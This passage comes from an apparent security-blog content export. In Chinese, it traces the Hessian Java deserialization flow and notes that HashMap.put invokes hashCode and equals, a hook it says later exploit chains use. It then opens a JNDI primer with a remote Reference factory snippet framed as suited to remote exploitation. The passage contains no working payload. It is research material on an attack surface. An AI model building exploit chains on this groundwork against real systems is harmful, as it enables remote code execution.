wiki、Java、Flash/Flex、Python、C++、.NET C#、D、Erlang、PHP、Ruby 和 Objective C 等。\n与 Hessian 类似的 web service 还有 Apache Axis 和 XFire（已沦为历史，其延续为 CXF），不过它们是对 SOAP 协议的一种实现，而前者是自满足的二进制协议，性能也更优。后面的内容将以 Java 语言为例，分析 Hessian 的序列化和反序列化部分。\nHessian 序列化示例与对比\n\n所用的 com.caucho.hessian 包的版本为 4.0.65\n\n下面以 seebug-1131 中代码为例，简单看看怎么使用 Hessian 的序列化，以及和 Java 自有的序列化相比有什么不同。\nimport java.io.Serializable;\n \npublic class Student implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private int id;\n    private String name;\n    private transient String gender;\n \n    public int getId() {\n        System.out.println(&quot;Student getId call&quot;);\n        return id;\n    }\n \n    public void setId(int id) {\n        System.out.println(&quot;Student setId call&quot;);\n        this.id = id;\n    }\n \n    public String getName() {\n        System.out.println(&quot;Student getName call&quot;);\n        return name;\n    }\n \n    public void setName(String name) {\n        System.out.println(&quot;Student setName call&quot;);\n        this.name = name;\n    }\n \n    public String getGender() {\n        System.out.println(&quot;Student getGender call&quot;);\n        return gender;\n    }\n \n    public void setGender(String gender) {\n        System.out.println(&quot;Student setGender call&quot;);\n        this.gender = gender;\n    }\n \n    public Student() {\n        System.out.println(&quot;Student default constractor call&quot;);\n    }\n \n    public Student(int id, String name, String gender) {\n        this.id = id;\n        this.name = name;\n        this.gender = gender;\n    }\n \n    @Override\n    public String toString() {\n        return &quot;Student(id=&quot; + id + &quot;,name=&quot; + name + &quot;,gender=&quot; + gender + &quot;)&quot;;\n    }\n}\n主函数如下\nimport com.caucho.hessian.io.HessianInput;\nimport com.caucho.hessian.io.HessianOutput;\n \nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n \npublic class HJSerialization {\n    public static &lt;T&gt; byte[] hserialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            HessianOutput output = new HessianOutput(os);\n            output.writeObject(t);\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n \n    public static &lt;T&gt; T hdeserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            HessianInput input = new HessianInput(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n \n    public static &lt;T&gt; byte[] jdkSerialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            ObjectOutputStream output = new ObjectOutputStream(os);\n            output.writeObject(t);\n            output.flush();\n            output.close();\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n \n    public static &lt;T&gt; T jdkDeserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            ObjectInputStream input = new ObjectInputStream(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n \n    public static void main(String[] args) {\n        Student stu = new Student(1, &quot;hessian&quot;, &quot;boy&quot;);\n \n        long htime1 = System.currentTimeMillis();\n        byte[] hdata = hserialize(stu);\n        long htime2 = System.currentTimeMillis();\n        System.out.println(&quot;hessian serialize result length = &quot; + hdata.length + &quot;,&quot; + &quot;cost time：&quot; + (htime2 - htime1));\n \n        long htime3 = System.currentTimeMillis();\n        Student hstudent = hdeserialize(hdata);\n        long htime4 = System.currentTimeMillis();\n        System.out.println(&quot;hessian deserialize result：&quot; + hstudent + &quot;,&quot; + &quot;cost time：&quot; + (htime4 - htime3));\n        System.out.println();\n \n        long jtime1 = System.currentTimeMillis();\n        byte[] jdata = jdkSerialize(stu);\n        long jtime2 = System.currentTimeMillis();\n        System.out.println(&quot;jdk serialize result length = &quot; + jdata.length + &quot;,&quot; + &quot;cost time：&quot; + (jtime2 - jtime1));\n \n        long jtime3 = System.currentTimeMillis();\n        Student jstudent = jdkDeserialize(jdata);\n        long jtime4 = System.currentTimeMillis();\n        System.out.println(&quot;jdk deserialize result：&quot; + jstudent + &quot;,&quot; + &quot;cost time：&quot; + (jtime4 - jtime3));\n    }\n}\n运行一下看看，输出结果如下：\nhessian serialize result length = 55,cost time：91\nhessian deserialize result：Student(id=1,name=hessian,gender=null),cost time：7\n\njdk serialize result length = 91,cost time：8\njdk deserialize result：Student(id=1,name=hessian,gender=null),cost time：94\n\n从对比结果可以看到，Hessian 的序列化结果比 Java 自有的要更精简一些，但序列化所需时间更长，优点是反序列化时速度很快。\nHessian 框架（Java Library）图\n待补充…\nHessian 反序列化流程分析\n下面主要分析 Java 语言实现下的 Hessian 的反序列化流程。以下面的示例代码为基础进行调试分析\nPeople 类\npublic class People {\n    int id;\n    String name;\n \n    public int getId() {\n        System.out.println(&quot;Call People getId&quot;);\n        return id;\n    }\n \n    public void setId(int id) {\n        System.out.println(&quot;Call People setId&quot;);\n        this.id = id;\n    }\n \n    public String getName() {\n        System.out.println(&quot;Call People getName&quot;);\n        return name;\n    }\n \n    public void setName(String name) {\n        System.out.println(&quot;Call People setName&quot;);\n        this.name = name;\n    }\n}\nStudent 类\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\nimport java.util.List;\nimport java.util.Map;\n \npublic class Student extends People implements Serializable {\n    private static final long serialVersionUID = 1L;\n \n    private static final Student student = new Student(111, &quot;student&quot;, &quot;man&quot;);\n    private transient String gender;\n    private Map&lt;String, Class&lt;Object&gt;&gt; innerMap;\n    private List&lt;Student&gt; friends;\n \n    public void setFriends(List&lt;Student&gt; friends) {\n        System.out.println(&quot;Call Student setFriends&quot;);\n        this.friends = friends;\n    }\n \n    public void getFriends(List&lt;Student&gt; friends) {\n        System.out.println(&quot;Call Student getFriends&quot;);\n        this.friends = friends;\n    }\n \n    public Map getInnerMap() {\n        System.out.println(&quot;Call Student getInnerMap&quot;);\n        return innerMap;\n    }\n \n    public void setInnerMap(Map innerMap) {\n        System.out.println(&quot;Call Student setInnerMap&quot;);\n        this.innerMap = innerMap;\n    }\n \n    public String getGender() {\n        System.out.println(&quot;Call Student getGender&quot;);\n        return gender;\n    }\n \n    public void setGender(String gender) {\n        System.out.println(&quot;Call Student setGender&quot;);\n        this.gender = gender;\n    }\n \n    public Student() {\n        System.out.println(&quot;Call Student default constructor&quot;);\n    }\n \n    public Student(int id, String name, String gender) {\n        System.out.println(&quot;Call Student custom constructor&quot;);\n        this.id = id;\n        this.name = name;\n        this.gender = gender;\n    }\n \n    private void readObject(ObjectInputStream ObjectInputStream) {\n        System.out.println(&quot;Call Student readObject&quot;);\n    }\n \n    private Object readResolve() {\n        System.out.println(&quot;Call Student readResolve&quot;);\n \n        return student;\n    }\n \n    @Override\n    public int hashCode() {\n        System.out.println(&quot;Call Student hashCode&quot;);\n        return super.hashCode();\n    }\n \n    @Override\n    protected void finalize() throws Throwable {\n        System.out.println(&quot;Call Student finalize&quot;);\n \n        super.finalize();\n    }\n \n    @Override\n    public String toString() {\n        return &quot;Student{&quot; +\n                &quot;id=&quot; + id +\n                &quot;, name=&#039;&quot; + name + &#039;\\&#039;&#039; +\n                &quot;, gender=&#039;&quot; + gender + &#039;\\&#039;&#039; +\n                &quot;, innerMap=&quot; + innerMap +\n                &quot;, friends=&quot; + friends +\n                &#039;}&#039;;\n    }\n}\n主函数\nimport com.caucho.hessian.io.HessianInput;\nimport com.caucho.hessian.io.HessianOutput;\n \nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.sql.SQLData;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n \npublic class HJSerialization {\n \n    public static &lt;T&gt; byte[] serialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            HessianOutput output = new HessianOutput(os);\n            output.writeObject(t);\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n \n    public static &lt;T&gt; T deserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            HessianInput input = new HessianInput(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n \n    public static void main(String[] args) {\n        int id = 111;\n        String name = &quot;hessian&quot;;\n        String gender = &quot;boy&quot;;\n \n        Map innerMap = new HashMap&lt;String, Class&lt;Object&gt;&gt;();\n        innerMap.put(&quot;1&quot;, ObjectInputStream.class);\n        innerMap.put(&quot;2&quot;, SQLData.class);\n \n        Student friend = new Student(222, &quot;hessian1&quot;, &quot;boy&quot;);\n        List friends = new ArrayList&lt;Student&gt;();\n        friends.add(friend);\n \n        Student stu = new Student();\n        stu.setId(id);\n        stu.setName(name);\n        stu.setGender(gender);\n        stu.setInnerMap(innerMap);\n        stu.setFriends(friends);\n \n        System.out.println(&quot;---------------hessian serialize----------------&quot;);\n        byte[] obj = serialize(stu);\n        System.out.println(new String(obj));\n \n        System.out.println(&quot;---------------hessian deserialize--------------&quot;);\n        Student student = deserialize(obj);\n        System.out.println(student);\n    }\n}\n在示例的代码中，为 People 和 Student 中的 Field 定义了 setter/getter，以及 readResovle、finalize、toString、hashCode 方法，以便观察到更多的行为。文章 seebug-1131 中给出了一个分析后的 流程图，作者使用的 Hessian 版本与我不同，但整体流程大同小异。\n示例中使用的是 com.caucho.hessian.io.HessianInput 来处理反序列化过程。readObject 函数代码如下\npublic Object readObject()\nthrows IOException\n{\n    int tag = read();\n \n    switch (tag) {\n    case &#039;N&#039;:\n        return null;\n \n    case &#039;T&#039;:\n        return Boolean.valueOf(true);\n \n    case &#039;F&#039;:\n        return Boolean.valueOf(false);\n \n    case &#039;I&#039;:\n        return Integer.valueOf(parseInt());\n \n    case &#039;L&#039;:\n        return Long.valueOf(parseLong());\n \n    case &#039;D&#039;:\n        return Double.valueOf(parseDouble());\n \n    case &#039;d&#039;:\n        return new Date(parseLong());\n \n    case &#039;x&#039;:\n    case &#039;X&#039;: {\n        _isLastChunk = tag == &#039;X&#039;;\n        _chunkLength = (read() &lt;&lt; 8) + read();\n \n        return parseXML();\n    }\n \n    case &#039;s&#039;:\n    case &#039;S&#039;: {\n        _isLastChunk = tag == &#039;S&#039;;\n        _chunkLength = (read() &lt;&lt; 8) + read();\n \n        int data;\n        _sbuf.setLength(0);\n \n        while ((data = parseChar()) &gt;= 0)\n        _sbuf.append((char) data);\n \n        return _sbuf.toString();\n    }\n \n    case &#039;b&#039;:\n    case &#039;B&#039;: {\n        _isLastChunk = tag == &#039;B&#039;;\n        _chunkLength = (read() &lt;&lt; 8) + read();\n \n        int data;\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n \n        while ((data = parseByte()) &gt;= 0)\n        bos.write(data);\n \n        return bos.toByteArray();\n    }\n \n    case &#039;V&#039;: {\n        String type = readType();\n        int length = readLength();\n \n        return _serializerFactory.readList(this, length, type);\n    }\n \n    case &#039;M&#039;: {\n        String type = readType();\n \n        return _serializerFactory.readMap(this, type);\n    }\n \n    case &#039;R&#039;: {\n        int ref = parseInt();\n \n        return _refs.get(ref);\n    }\n \n    case &#039;r&#039;: {\n        String type = readType();\n        String url = readString();\n \n        return resolveRemote(type, url);\n    }\n \n    default:\n        throw error(&quot;unknown code for readObject at &quot; + codeName(tag));\n    }\n}\nHessian 协议是根据 tag 值来决定后续如何操作的，由于 Hessian 序列化时将结果处理成了 Map 形式，所以第一个 tag 总是 M(ascii 77)。并读取 type=com.trganda.peo.Student，再调用 _serializerFactory.readMap(this, type)。\npublic Object readMap(AbstractHessianInput in, String type)\nthrows HessianProtocolException, IOException\n{\n    Deserializer deserializer = getDeserializer(type);\n \n    if (deserializer != null)\n        return deserializer.readMap(in);\n    else if (_hashMapDeserializer != null)\n        return _hashMapDeserializer.readMap(in);\n    else {\n        _hashMapDeserializer = new MapDeserializer(HashMap.class);\n \n        return _hashMapDeserializer.readMap(in);\n    }\n}\n在这里，反序列化过程分为主要两步，根据 type 获取一个 Deserializer，并将后续反序列化流程交由它处理。\n获取目标类型反序列化器\ngetDeserializer 方法如下\npublic Deserializer getDeserializer(String type)\n    throws HessianProtocolException\n{\n    if (type == null || type.equals(&quot;&quot;))\n        return null;\n \n    Deserializer deserializer;\n \n    if (_cachedTypeDeserializerMap != null) {\n        synchronized (_cachedTypeDeserializerMap) {\n        deserializer = (Deserializer) _cachedTypeDeserializerMap.get(type);\n        }\n \n        if (deserializer != null)\n        return deserializer;\n    }\n \n \n    deserializer = (Deserializer) _staticTypeMap.get(type);\n    if (deserializer != null)\n        return deserializer;\n \n    if (type.startsWith(&quot;[&quot;)) {\n        Deserializer subDeserializer = getDeserializer(type.substring(1));\n \n        if (subDeserializer != null)\n        deserializer = new ArrayDeserializer(subDeserializer.getType());\n        else\n        deserializer = new ArrayDeserializer(Object.class);\n    }\n    else {\n        try {\n        //Class cl = Class.forName(type, false, getClassLoader());\n \n        Class cl = loadSerializedClass(type);\n \n        deserializer = getDeserializer(cl);\n        } catch (Exception e) {\n        log.warning(&quot;Hessian/Burlap: &#039;&quot; + type + &quot;&#039; is an unknown class in &quot; + getClassLoader() + &quot;:\\n&quot; + e);\n \n        log.log(Level.FINER, e.toString(), e);\n        }\n    }\n \n    if (deserializer != null) {\n        if (_cachedTypeDeserializerMap == null)\n        _cachedTypeDeserializerMap = new HashMap(8);\n \n        synchronized (_cachedTypeDeserializerMap) {\n        _cachedTypeDeserializerMap.put(type, deserializer);\n        }\n    }\n \n    return deserializer;\n}\n首先尝试从 _cachedTypeDeserializerMap（用于缓存之前使用过的 Deserializer）中获取，如何获取不到再尝试从 _staticTypeMap 中获取。依旧失败的话，则判断 type 是不是数组，是就根据数组基本类型来获取其 Deserializer，并创建 ArrayDeserializer 返回，否则尝试通过目标 type 的 clazz 形式来获取。本例会进入 getDeserializer(cl)\npublic Deserializer getDeserializer(Class cl)\n    throws HessianProtocolException\n{\n    Deserializer deserializer;\n \n    if (_cachedDeserializerMap != null) {\n        deserializer = (Deserializer) _cachedDeserializerMap.get(cl);\n \n        if (deserializer != null)\n        return deserializer;\n    }\n \n    deserializer = loadDeserializer(cl);\n \n    if (_cachedDeserializerMap == null)\n        _cachedDeserializerMap = new ConcurrentHashMap(8);\n \n    _cachedDeserializerMap.put(cl, deserializer);\n \n    return deserializer;\n}\n与前面类似，会尝试从 _cachedDeserializerMap 中获取，拿不到再调用 loadDeserializer(cl)，并将结果放入缓存中。在这个例子中自然是拿不到的，继续跟入 loadDeserializer\nprotected Deserializer loadDeserializer(Class cl)\n    throws HessianProtocolException\n{\n    Deserializer deserializer = null;\n \n    for (int i = 0;\n            deserializer == null &amp;&amp; _factories != null &amp;&amp; i &lt; _factories.size();\n            i++) {\n        AbstractSerializerFactory factory;\n        factory = (AbstractSerializerFactory) _factories.get(i);\n \n        deserializer = factory.getDeserializer(cl);\n    }\n \n    if (deserializer != null)\n        return deserializer;\n \n    // XXX: need test\n    deserializer = _contextFactory.getDeserializer(cl.getName());\n \n    if (deserializer != null)\n        return deserializer;\n \n    ContextSerializerFactory factory = null;\n \n    if (cl.getClassLoader() != null)\n        factory = ContextSerializerFactory.create(cl.getClassLoader());\n    else\n        factory = ContextSerializerFactory.create(_systemClassLoader);\n \n    deserializer = factory.getDeserializer(cl.getName());\n \n    if (deserializer != null)\n        return deserializer;\n \n    deserializer = factory.getCustomDeserializer(cl);\n \n    if (deserializer != null)\n        return deserializer;\n \n    if (Collection.class.isAssignableFrom(cl))\n        deserializer = new CollectionDeserializer(cl);\n \n    else if (Map.class.isAssignableFrom(cl)) {\n        deserializer = new MapDeserializer(cl);\n    }\n    else if (Iterator.class.isAssignableFrom(cl)) {\n        deserializer = IteratorDeserializer.create();\n    }\n    else if (Annotation.class.isAssignableFrom(cl)) {\n        deserializer = new AnnotationDeserializer(cl);\n    }\n    else if (cl.isInterface()) {\n        deserializer = new ObjectDeserializer(cl);\n    }\n    else if (cl.isArray()) {\n        deserializer = new ArrayDeserializer(cl.getComponentType());\n    }\n    else if (Enumeration.class.isAssignableFrom(cl)) {\n        deserializer = EnumerationDeserializer.create();\n    }\n    else if (Enum.class.isAssignableFrom(cl))\n        deserializer = new EnumDeserializer(cl);\n \n    else if (Class.class.equals(cl))\n        deserializer = new ClassDeserializer(getClassLoader());\n \n    else\n        deserializer = getDefaultDeserializer(cl);\n \n    return deserializer;\n}\n这里先遍历 _factories 尝试获取，也就是用户自定义的 factory，没有的话再通过 _contextFactory.getDeserializer(cl.getName()) 获取，_contextFactory 为默认的当前上下文中的 ContextSerializerFactory 类对象。若获取不到，则尝试，根据 cl 的类加载器或系统的类加载器重新创建一个并再次尝试获取。失败，则查找是否有自定义 Deserializer 来获取，即调用 getCustomDeserializer。本例都不满足上面的情况，会继续进入到后面的 if else，并判断 cl 是否为 Java 内部已有的类型，否则就调用 getDefaultDeserializer 尝试获取默认的 Deserializer。\n/**\n* Returns the default serializer for a class that isn&#039;t matched\n* directly.  Application can override this method to produce\n* bean-style serialization instead of field serialization.\n*\n* @param cl the class of the object that needs to be serialized.\n*\n* @return a serializer object for the serialization.\n*/\nprotected Deserializer getDefaultDeserializer(Class cl)\n{\n    if (InputStream.class.equals(cl))\n        return InputStreamDeserializer.DESER;\n \n    if (_isEnableUnsafeSerializer) {\n        return new UnsafeDeserializer(cl, _fieldDeserializerFactory);\n    }\n    else\n        return new JavaDeserializer(cl, _fieldDeserializerFactory);\n}\n第一个 if 和前面类似，判断 cl 是否为 java.io.InputStream，如果不是则判断是否允许使用了不安全的 Serializer（默认是开启的），本例符合这个条件，会返回 UnsafeDeserializer。否则返回 JavaDeserializer，其行为与标准的 Java 反序列类似。\n至此，就拿到了 Deserializer 了，也就是 UnsafeDeserializer。\n对象创建\n完成上面一步之后，回到 readMap 函数\npublic Object readMap(AbstractHessianInput in, String type)\n    throws HessianProtocolException, IOException\n{\n    Deserializer deserializer = getDeserializer(type);\n \n    if (deserializer != null)\n        return deserializer.readMap(in);\n    else if (_hashMapDeserializer != null)\n        return _hashMapDeserializer.readMap(in);\n    else {\n        _hashMapDeserializer = new MapDeserializer(HashMap.class);\n \n        return _hashMapDeserializer.readMap(in);\n    }\n}\n它会调用 deserializer.readMap 进行反序列化操作。进入该函数\npublic Object readMap(AbstractHessianInput in)\n    throws IOException\n{\n    try {\n        Object obj = instantiate();\n \n        return readMap(in, obj);\n    } catch (IOException e) {\n        throw e;\n    } catch (RuntimeException e) {\n        throw e;\n    } catch (Exception e) {\n        throw new IOExceptionWrapper(_type.getName() + &quot;:&quot; + e.getMessage(), e);\n    }\n}\n首先，通过 instantiate 创建一个 Student 对象，因为这个是 UnsafeDeserializer，它会通过 sun.misc.Unsafe#allocateInstance 来构造（不会调用构造函数）一个指定的对象，并对其 field 赋默认值。\n属性赋值\n创建好空的对象后，就进入到恢复 obj 属性值的过程了。跟入 readMap\npublic Object readMap(AbstractHessianInput in, Object obj)\n    throws IOException\n{\n    try {\n        int ref = in.addRef(obj);\n \n        while (! in.isEnd()) {\n            Object key = in.readObject();\n \n            FieldDeserializer2 deser = (FieldDeserializer2) _fieldMap.get(key);\n \n            if (deser != null)\n                deser.deserialize(in, obj);\n            else\n                in.readObject();\n        }\n \n        in.readMapEnd();\n \n        Object resolve = resolve(in, obj);\n \n        if (obj != resolve)\n        in.setRef(ref, resolve);\n \n        return resolve;\n    } catch (IOException e) {\n        throw e;\n    } catch (Exception e) {\n        throw new IOExceptionWrapper(e);\n    }\n}\n首先将 obj 添加进 ref 中，这样后续反序列化中读取引用类型时，通过它来查找。\n接着进入 while 循环，恢复各个 field 的值。这里首先读取 key，也就是序列化时，Student 成员的名称（不包含 transient 修饰的成员）。并从 _fieldMap（它是在创建 UnsafeDeserializer 时通过反射机制构造的）获取其对应的 Deserializer，它的内容如下\n&quot;innerMap&quot; -&gt; {FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer@747}\n&quot;name&quot; -&gt; {FieldDeserializer2FactoryUnsafe$StringFieldDeserializer@749}\n&quot;id&quot; -&gt; {FieldDeserializer2FactoryUnsafe$IntFieldDeserializer@751}\n&quot;friends&quot; -&gt; {FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer@753}\n这里需要恢复的 field 一共有 4 个，不包括 gender，因为它被标记为 transient。它们的恢复过程是类似的，这里主要以 innerMap 为例分析其流程，它与后续 Hessian 反序列化的利用链的利用思路有关。\n跟入 ObjectFieldDeserializer#deserialize\npublic void deserialize(AbstractHessianInput in, Object obj)\n    throws IOException\n{\n    Object value = null;\n \n    try {\n        value = in.readObject(_field.getType());\n \n        _unsafe.putObject(obj, _offset, value);\n        } catch (Exception e) {\n        logDeserializeError(_field, obj, value, e);\n        }\n    }\n}\n调用 HessianInput#readObject 进行反序列化，首先会获取 tag，再根据它的值决定后续步骤，这里 tag 为 M，即 Map 相关代码如下\npublic Object readObject(Class cl)\n    throws IOException\n{\n    if (cl == null || cl == Object.class)\n        return readObject();\n \n    int tag = read();\n \n    switch (tag) {\n        ...\n        case &#039;M&#039;:\n        {\n            String type = readType();\n \n            // hessian/3386\n            if (&quot;&quot;.equals(type)) {\n                Deserializer reader;\n                reader = _serializerFactory.getDeserializer(cl);\n \n                return reader.readMap(this);\n            } else {\n                Deserializer reader;\n                reader = _serializerFactory.getObjectDeserializer(type);\n \n                return reader.readMap(this);\n            }\n        }\n        ...\n \n    }\n    ...\n}\n这里获取 type 时，其值为空，进入 MapDeserializer#readMap\npublic Object readMap(AbstractHessianInput in)\n    throws IOException\n{\n    Map map;\n \n    if (_type == null)\n        map = new HashMap();\n    else if (_type.equals(Map.class))\n        map = new HashMap();\n    else if (_type.equals(SortedMap.class))\n        map = new TreeMap();\n    else {\n        try {\n        map = (Map) _ctor.newInstance();\n        } catch (Exception e) {\n        throw new IOExceptionWrapper(e);\n        }\n    }\n \n    in.addRef(map);\n \n    while (! in.isEnd()) {\n        map.put(in.readObject(), in.readObject());\n    }\n \n    in.readEnd();\n \n    return map;\n}\n在这里如果 _type 是 Map 接口类型则使用 HashMap，如果是 SortedMap 类型则使用 TreeMap，其它 Map 则会调用对应的默认构造器，本例中由于是 Map 接口类型，使用的是 HashMap。\n接着进入了一个 while 循环，它会读取 key-value 的键值对并调用 put 方法，这也是后续会提及的利用链，使用到的一部分。在读取 key-value 的键值对后，跟入 put 方法。\npublic V put(K key, V value) {\n    return putVal(hash(key), key, value, false, true);\n}\n这里 map 为 HashMap，所有在调用 put 方法时，会调用 key 的 hashCode 函数，并且 putVal 函数会调用 key 的 equals 方法（非第一次插入），判断是否存在重复键值。while 循环结束，恢复所有的键值对后，返回至 ObjectFieldDeserializer#deserialize 并通过 _unsafe.putObject(obj, _offset, value) 来恢复 innerMap 的值。"},"articles/security/java/java-native-serialization/JNDI":{"title":"JNDI","links":["articles/security/java/java-native-serialization/JNDI","cheat-sheets/Java-Cheat-Sheet"],"tags":["jndi","java"],"content":"JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口。通过调用 JNDI 的 API 应用程序可以定位资源和其他程序对象。JNDI 是 Java EE 的重要部分，需要注意的是它并不只是包含了 DataSource(JDBC 数据源)，JNDI 可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。\n\nNaming Service 命名服务：\n命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS 系统将计算机名和 IP 地址进行关联、文件系统将文件名和文件句柄进行关联等等。\nDirectory Service 目录服务：\n目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。\nReference 引用：\n在一些命名服务系统中，系统并不会直接将 Java 对象序列化后存储在系统中，而是持有对象的引用。这是因为通常序列化的对象占有的空间还是略大的。\n所谓引用，包含了如何访问实际对象的信息，JNDI 接口中提供了类 javax.naming.Reference，用于表示引用，通过引用可以获取实际的 Java 对象。Reference 对象常用的有 3 个参数，指向的 Java 对象类名，工厂类名，工厂类的地址：\n// 参数分别为类名，工厂类的类名，工厂类地址\nReference reference = new Reference(&quot;myClassName&quot;, &quot;factoryClassName&quot;, FactoryURL);\nReferenceWrapper wrapper = new ReferenceWrapper(reference);\nctx.bind(&quot;Foo&quot;, wrapper);\n\nReference 还有一个成员 addrs，存储引用中的地址信息，可以指定多个，默认为空。\n\n当然还有其它方式创建 Reference 对象，不过这种方式更利于进行漏洞的远程利用。\nJNDI 目录服务\n访问 JNDI 目录服务时会通过预先设置好环境变量访问对应的服务， 如果创建 JNDI 上下文 (Context) 时未指定环境变量对象，JNDI 会自动搜索系统属性 (System.getProperty())、applet 参数和应用程序资源文件 (jndi.properties)。\n使用 JNDI 创建目录服务对象代码片段\n// 创建环境变量对象\nProperties properties = new Properties();\n \n// 设置JNDI初始化工厂类名\nproperties.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;类名&quot;);\n \n// 设置JNDI提供服务的URL地址\nproperties.setProperty(Context.PROVIDER_URL, &quot;url&quot;);\n \n// 创建JNDI目录服务对象\nDirContext context = new InitialDirContext(properties);\nContext.INITIAL_CONTEXT_FACTORY(初始上下文工厂的环境属性名称) 指的是 JNDI 服务处理的具体类名称，如：DNS 服务可以使用 com.sun.jndi.dns.DnsContextFactory 类来处理，不同的服务类型会有不同等工厂类。JNDI 上下文工厂类必须实现 javax.naming.spi.InitialContextFactory 接口，通过重写 getInitialContext 方法来创建服务。该接口的内容如下：\nInitialContextFactory\npackage javax.naming.spi;\n \npublic interface InitialContextFactory {\n        /**\n          * Creates an Initial Context for beginning name resolution.\n          * Special requirements of this context are supplied\n          * using &lt;code&gt;environment&lt;/code&gt;.\n          *&lt;p&gt;\n          * The environment parameter is owned by the caller.\n          * The implementation will not modify the object or keep a reference\n          * to it, although it may keep a reference to a clone or copy.\n          *\n          * @param environment The possibly null environment\n          *             specifying information to be used in the creation\n          *             of the initial context.\n          * @return A non-null initial context object that implements the Context\n          *             interface.\n          * @exception NamingException If cannot create an initial context.\n          */\n        public Context getInitialContext(Hashtable&lt;?,?&gt; environment)\n            throws NamingException;\n}\nJNDI 示例 DNS 解析\nJNDI 支持访问 DNS 服务，注册环境变量时设置 JNDI 服务处理的工厂类为 com.sun.jndi.dns.DnsContextFactory 即可。\npackage com.sun.jndi.dns;\n \npublic class DnsContextFactory implements InitialContextFactory {\n \n  // 获取处理DNS的JNDI上下文对象\n  public Context getInitialContext(Hashtable&lt;?, ?&gt; var1) throws NamingException {\n    if (var1 == null) {\n      var1 = new Hashtable(5);\n    }\n \n    return urlToContext(getInitCtxUrl(var1), var1);\n  }\n \n  // more code ...\n}\n进行 DNS 解析\npublic static void main(String[] args) {\n    Properties properties = new Properties();\n    properties.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.dns.DnsContextFactory&quot;);\n    properties.setProperty(Context.PROVIDER_URL, &quot;dns://223.6.6.6/&quot;);\n \n    try {\n        DirContext context = new InitialDirContext(properties);\n        Attributes attribute = context.getAttributes(&quot;baidu.com&quot;, new String[]{&quot;A&quot;});\n \n        System.out.println(attribute);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}\n输出\n{a=A: 110.242.68.66, 39.156.66.10}\nJNDI 示例 RMI 调用\n工厂类为 com.sun.jndi.rmi.registry.RegistryContextFactory\npublic static void main(String[] args) {\n    String providerURL = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT;\n \n    // 创建环境变量对象\n    Properties env = new Properties();\n \n    // 设置JNDI初始化工厂类名\n    env.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);\n \n    // 设置JNDI提供服务的URL地址\n    env.setProperty(Context.PROVIDER_URL, providerURL);\n \n    // 通过JNDI调用远程RMI方法测试，等同于com.anbai.sec.rmi.RMIClientTest类的Demo\n    try {\n        // 创建JNDI目录服务对象\n        DirContext context = new InitialDirContext(env);\n \n        // 通过命名服务查找远程RMI绑定的RMITestInterface对象\n        RMITestInterface testInterface = (RMITestInterface) context.lookup(RMI_NAME);\n \n        // 调用远程的RMITestInterface接口的test方法\n        String result = testInterface.test();\n \n        System.out.println(result);\n    } catch (NamingException e) {\n        e.printStackTrace();\n    } catch (RemoteException e) {\n        e.printStackTrace();\n    }\n}\nJNDI 示例 LDAP\n工厂类为 com.sun.jndi.ldap.LdapCtxFactory：\npublic static void main(String[] args) {\n    try {\n        // 设置用户LDAP登陆用户DN\n        String userDN = &quot;cn=Manager,dc=javaweb,dc=org&quot;;\n \n        // 设置登陆用户密码\n        String password = &quot;123456&quot;;\n \n        // 创建环境变量对象\n        Properties env = new Properties();\n \n        // 设置JNDI初始化工厂类名\n        env.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);\n \n        // 设置JNDI提供服务的URL地址\n        env.setProperty(Context.PROVIDER_URL, &quot;ldap://localhost:389&quot;);\n \n        // 设置安全认证方式\n        env.setProperty(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);\n \n        // 设置用户信息\n        env.setProperty(Context.SECURITY_PRINCIPAL, userDN);\n \n        // 设置用户密码\n        env.setProperty(Context.SECURITY_CREDENTIALS, password);\n \n        // 创建LDAP连接\n        DirContext ctx = new InitialDirContext(env);\n \n    \t// 